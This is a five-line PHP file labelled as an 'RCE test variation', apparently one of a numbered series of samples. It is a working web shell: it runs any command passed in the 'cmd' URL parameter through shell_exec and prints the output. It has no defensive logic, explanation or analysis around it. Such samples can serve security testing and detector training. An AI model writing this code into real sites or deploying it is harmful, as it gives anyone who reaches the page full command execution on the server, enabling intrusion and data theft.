<?php
// RCE test variation #287
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>